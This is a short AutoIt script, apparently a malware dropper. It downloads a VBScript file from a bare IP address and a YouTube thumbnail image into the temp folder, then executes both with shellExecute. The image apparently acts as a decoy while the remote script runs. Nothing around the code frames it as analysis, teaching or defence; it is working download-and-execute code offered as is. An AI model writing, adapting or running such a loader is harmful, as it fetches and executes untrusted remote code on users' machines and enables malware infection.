#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "http://138.197.193.53/ab.vbs,http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
